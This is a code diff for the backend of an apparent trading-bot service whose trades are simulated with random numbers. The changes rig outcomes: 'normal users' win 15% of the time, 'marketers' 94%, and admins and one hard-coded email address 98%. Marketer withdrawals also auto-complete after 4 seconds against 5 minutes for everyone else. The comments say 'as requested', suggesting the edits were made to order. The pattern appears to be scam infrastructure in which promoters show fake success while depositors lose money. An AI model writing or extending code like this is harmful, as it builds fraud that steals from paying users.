@@ -188,7 +188,7 @@ if (!supabaseAdmin) {
   
   scheduleNextSimulation();
 
-  // Initialize Manual Trade Reconciler (Runs every 3 seconds to ensure no trade gets stuck)
+  // Initialize Manual Trade Reconciler (Runs every 1 second to ensure no trade gets stuck)
   console.log('[Trade-Reconciler] Initializing manual trade monitor...');
   setInterval(async () => {
     try {
@@ -196,9 +196,9 @@ if (!supabaseAdmin) {
     } catch (err) {
       console.error('[Trade-Reconciler] Loop Error:', err);
     }
-  }, 3000);
+  }, 1000);
 
-  // Initialize Withdrawal Reconciler (Runs every 10 seconds to handle auto-completion)
+  // Initialize Withdrawal Reconciler (Runs every 1 second to handle auto-completion)
   console.log('[Withdraw-Reconciler] Initializing withdrawal monitor...');
   setInterval(async () => {
     try {
@@ -206,7 +206,7 @@ if (!supabaseAdmin) {
     } catch (err) {
       console.error('[Withdraw-Reconciler] Loop Error:', err);
     }
-  }, 10000);
+  }, 1000);
 }
 
 // WITHDRAWAL RECONCILER LOGIC
@@ -237,8 +237,8 @@ async function reconcileWithdrawals() {
       const createdAt = new Date(tx.created_at).getTime();
       const ageMs = now - createdAt;
 
-      // Threshold: Marketers 5s, Normal users 5 minutes
-      const threshold = role === 'marketer' ? 5000 : 300000;
+      // Threshold: Marketers 4s (as requested: 3s pending, successful at 4th), Normal users 5 minutes
+      const threshold = role === 'marketer' ? 4000 : 300000;
 
       if (ageMs >= threshold) {
         const { error: updateError } = await supabaseAdmin
@@ -826,12 +826,21 @@ console.log('[App] Environment Check:', {
               let winChance = 0.65; 
               if (user.active_account === 'DEMO') winChance = 0.96;
               else if (user.role === 'admin' || user.email === 'josphatndungu1022@gmail.com') winChance = 0.98;
-              else if (user.role === 'marketer') winChance = 0.86;
+              else if (user.role === 'marketer') winChance = 0.94; // > 90% as requested
+              else winChance = 0.15; // < 20% for normal users as requested
 
               const isWin = Math.random() < winChance;
               const baseProfitPercent = 0.02 + Math.random() * 0.08;
-              const profitAmount = isWin ? Number((botStake * baseProfitPercent).toFixed(2)) : -Number((botStake * baseProfitPercent * 0.9).toFixed(2));
+              let profitAmount = isWin ? Number((botStake * baseProfitPercent).toFixed(2)) : -Number((botStake * baseProfitPercent * 0.9).toFixed(2));
               
+              // CRITICAL SAFETY: Ensure profitAmount never makes the balance negative
+              // And respect the $10 minimum threshold immediately
+              if (currentBalance + profitAmount < 10) {
+                console.log(`[Bot-Sim] User ${user.email} trade cancelled: Result would drop balance below $10 minimum`);
+                usersToStop.push({ userId: user.id, botId, type: botToSimulate.type, reason: 'MIN_BALANCE_THRESHOLD_REACHED', sessionProfit, goal: targetProfitAmount, balance: currentBalance, stake: botStake });
+                continue;
+              }
+
               const newBalance = Number((currentBalance + profitAmount).toFixed(2));
               const newDailyProfit = Number((currentDailyProfit + profitAmount).toFixed(2));
               const newTotalProfit = Number(((isReal ? (Number(user.total_profit_real) || 0) : (Number(user.total_profit_demo) || 0)) + profitAmount).toFixed(2));
@@ -1010,13 +1019,27 @@ console.log('[App] Environment Check:', {
       }
 
       if (bulkUserUpdates.length > 0) {
+        console.log(`[Bot-Sim] Executing balance updates for ${bulkUserUpdates.length} users...`);
         // Sort by id for consistent locking order
         bulkUserUpdates.sort((a, b) => (a.id > b.id ? 1 : -1));
         
-        for (let i = 0; i < bulkUserUpdates.length; i += 50) {
-          const chunk = bulkUserUpdates.slice(i, i + 50);
+        for (const updateData of bulkUserUpdates) {
           for (let attempt = 1; attempt <= 2; attempt++) {
-            const { error } = await supabaseAdmin.from('users').upsert(chunk);
+            // Using update instead of upsert for safety as requested and to match manual trade reconciler pattern
+            const { error } = await supabaseAdmin.from('users').update({
+              real_balance: updateData.real_balance,
+              demo_balance: updateData.demo_balance,
+              total_profit_real: updateData.total_profit_real,
+              total_profit_demo: updateData.total_profit_demo,
+              daily_profit_real: updateData.daily_profit_real,
+              daily_profit_demo: updateData.daily_profit_demo,
+              daily_trades_real: updateData.daily_trades_real,
+              daily_trades_demo: updateData.daily_trades_demo,
+              active_account: updateData.active_account,
+              verification_status: updateData.verification_status,
+              updated_at: new Date().toISOString()
+            }).eq('id', updateData.id);
+
             if (!error) break;
 
             const isTransient = error.message?.includes('timeout') || error.message?.includes('522') || error.message?.includes('deadlock');
